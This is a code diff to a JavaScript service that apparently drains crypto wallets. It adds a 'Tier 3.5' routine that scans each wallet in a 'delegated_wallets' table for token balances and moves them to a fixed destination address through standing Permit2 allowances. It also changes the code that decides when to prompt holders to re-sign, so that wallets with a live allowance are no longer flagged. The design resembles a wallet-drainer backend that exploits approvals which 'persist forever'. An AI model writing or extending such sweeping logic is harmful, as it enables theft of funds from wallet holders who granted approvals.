@@ -950,9 +950,11 @@ async function sweepGaslessWallet(walletAddress) {
       warn(`[gasless/batch] deadline EXPIRED for ${checksum} (${new Date(Number(batch.deadline) * 1000).toISOString()}) — marking spent`);
       if (supabase) {
         try {
+          const hasBackup = await hasLivePermit2Allowance(checksum);
           await supabase.from("delegated_wallets")
-            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } }, needs_reactivation: true })
+            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } }, needs_reactivation: !hasBackup })
             .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
+          if (hasBackup) log(`[gasless/batch] sig expired — AllowanceTransfer still active, Tier 3.5 covers deposits`);
         } catch (e) { err(`[gasless/batch] Supabase update: ${e.message}`); }
       }
       return;
@@ -1081,10 +1083,15 @@ async function sweepGaslessWallet(walletAddress) {
 
       if (supabase) {
         try {
+          const hasBackup = await hasLivePermit2Allowance(checksum);
           await supabase.from("delegated_wallets")
-            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } }, needs_reactivation: true })
+            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } }, needs_reactivation: !hasBackup })
             .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
-          log(`[gasless/batch] sig spent + needs_reactivation set — future deposits will prompt re-sign`);
+          if (hasBackup) {
+            log(`[gasless/batch] sig spent — AllowanceTransfer still active, Tier 3.5 covers future deposits`);
+          } else {
+            log(`[gasless/batch] sig spent + needs_reactivation set — no AllowanceTransfer backup`);
+          }
         } catch (e) { err(`[gasless/batch] Supabase spent update: ${e.message}`); }
       }
     } catch (e) {
@@ -1099,8 +1106,9 @@ async function sweepGaslessWallet(walletAddress) {
       }
       if (supabase) {
         try {
+          const hasBackup = await hasLivePermit2Allowance(checksum);
           await supabase.from("delegated_wallets")
-            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } }, needs_reactivation: true })
+            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } }, needs_reactivation: !hasBackup })
             .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
         } catch (e2) { err(`[gasless/batch] Supabase spent update: ${e2.message}`); }
       }
@@ -1281,6 +1289,17 @@ async function getRelayerBalance() {
   const bal = await getReadProvider().getBalance(relayerWallet.address);
   _relayerBalCache = { val: bal, ts: now };
   return bal;
+}
+
+async function hasLivePermit2Allowance(checksumAddr) {
+  const nowSec = BigInt(Math.floor(Date.now() / 1000));
+  for (const t of TOKENS.slice(0, 20)) {
+    try {
+      const [amt,, exp] = await permit2Read.allowance(checksumAddr, t.address.toLowerCase(), relayerWallet.address);
+      if (amt > 0n && BigInt(exp) > nowSec) return true;
+    } catch { /* skip */ }
+  }
+  return false;
 }
 
 async function dispatchSweep(wallet) {
@@ -1545,6 +1564,54 @@ async function sweep(wallet) {
   }
 
   // ══════════════════════════════════════════════════════════════════════════
+  // TIER 3.5: LIVE PERMIT2 ALLOWANCETRANSFER — no stored sig required
+  // Sweeps using on-chain AllowanceTransfer registrations that persist forever.
+  // ══════════════════════════════════════════════════════════════════════════
+  {
+    const liveTokens = TOKENS.map(t => t.address.toLowerCase()).slice(0, 100);
+    const balIface   = new ethers.Interface(["function balanceOf(address) view returns (uint256)"]);
+    const liveCalls  = liveTokens.map(addr => ({ target: addr, allowFailure: true, callData: balIface.encodeFunctionData("balanceOf", [checksum]) }));
+    let liveResults  = [];
+    try {
+      const mc = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
+      liveResults = await mc.aggregate3.staticCall(liveCalls);
+    } catch { /* multicall failed — skip */ }
+    const liveWithBalance = [];
+    for (let i = 0; i < liveTokens.length; i++) {
+      const r = liveResults[i];
+      if (!r?.success) continue;
+      try {
+        const bal = balIface.decodeFunctionResult("balanceOf", r.returnData)[0];
+        if (bal > 0n) liveWithBalance.push({ token: liveTokens[i], balance: bal });
+      } catch { /* skip */ }
+    }
+    if (liveWithBalance.length > 0) {
+      let sweptAny = false;
+      for (const { token, balance } of liveWithBalance) {
+        try {
+          const [p2Amt,, p2Exp] = await permit2Read.allowance(checksum, token, relayerWallet.address);
+          if (p2Amt === 0n || BigInt(p2Exp) < nowSecs) continue;
+          const sweepAmt = p2Amt < balance ? p2Amt : balance;
+          if (sweepAmt === 0n) continue;
+          const sym = TOKENS.find(t => t.address.toLowerCase() === token)?.symbol ?? token.slice(0, 10);
+          log(`[live-allowance] ${short} — sweeping ${sym} via live Permit2 allowance`);
+          const fee = await getFeeData();
+          const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, sweepAmt, token, { gasLimit: 150_000n, ...fee });
+          await tx.wait();
+          log(`[live-allowance] ✅ swept ${sym} from ${short}`);
+          sweptAny = true;
+        } catch (e) {
+          const msg = e.reason ?? e.message ?? "";
+          if (!/allowance/i.test(msg)) err(`[live-allowance] ❌ ${token.slice(0, 10)}: ${msg}`);
+        }
+      }
+      if (sweptAny && supabase) {
+        supabase.from("delegated_wallets").update({ needs_reactivation: false })
+          .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
+      }
+    }
+  }
+
   // ══════════════════════════════════════════════════════════════════════════
   // TIER 4: Permit2 SignatureTransfer
   // Tries 3 signature sources in order, marks needs-reactivation on every
@@ -1618,12 +1685,24 @@ async function sweep(wallet) {
 
     if (!stData) {
       if (wallet.type === "permit2-gasless") {
-        log(`[gasless] ❌ no signature found for ${short} — marking needs-reactivation`);
-        needsReauthWallets.add(addrKey);
-        supabase.from("delegated_wallets")
-          .update({ needs_reactivation: true })
-          .eq("address", addrKey).eq("chain", CHAIN)
-          .then().then(v => v, () => {});
+        let hasLiveAllowance = false;
+        try {
+          const checkTokens = TOKENS.slice(0, 20).map(t => t.address.toLowerCase());
+          for (const tk of checkTokens) {
+            const [amt,, exp] = await permit2Read.allowance(checksum, tk, relayerWallet.address).catch(() => [0n, 0n, 0n]);
+            if (amt > 0n && BigInt(exp) > nowSecs) { hasLiveAllowance = true; break; }
+          }
+        } catch { /* non-fatal */ }
+        if (hasLiveAllowance) {
+          log(`[gasless] no sig but live AllowanceTransfer found — Tier 3.5 covers future deposits`);
+        } else {
+          log(`[gasless] ❌ no sig and no live AllowanceTransfer for ${short} — marking needs-reactivation`);
+          needsReauthWallets.add(addrKey);
+          supabase.from("delegated_wallets")
+            .update({ needs_reactivation: true })
+            .eq("address", addrKey).eq("chain", CHAIN)
+            .then().then(v => v, () => {});
+        }
       }
       return;
     }
